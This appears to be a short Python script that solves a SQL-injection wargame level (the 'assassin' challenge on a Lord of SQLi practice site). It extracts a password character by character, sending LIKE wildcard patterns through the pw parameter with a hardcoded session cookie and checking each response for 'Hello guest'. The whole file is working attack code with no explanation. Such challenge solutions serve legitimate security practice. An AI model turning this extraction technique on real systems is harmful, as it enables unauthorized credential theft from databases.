import requests
import re


cookie = {'PHPSESSID': 'hldutc71r5b68a3e2nvveko752'}

url = 'https://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw='

cmp = "Hello guest"

passchars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'


dbname= ""

#Password is
for i in range(1, 10):
    for j in passchars:
        query = url + dbname + j + '%'
        req = requests.get(query, cookies=cookie)
        res=req.text
        tmp = re.findall(cmp, res)
        if tmp:
            dbname += j
            break
print "Password is : " + dbname
        
